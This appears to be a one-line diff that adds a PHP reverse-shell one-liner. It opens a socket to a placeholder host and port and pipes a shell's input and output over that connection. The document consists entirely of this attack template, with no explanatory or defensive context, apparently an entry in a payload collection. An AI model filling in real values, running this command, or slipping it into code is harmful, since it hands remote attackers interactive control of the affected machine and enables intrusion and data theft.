@@ -1,0 +1,1 @@
+php -r '$sock = fsockopen("*\host*",*\port*); proc_open("*\shell*", array(0=>$sock, 1=>$sock, 2=>$sock), $pipes);'
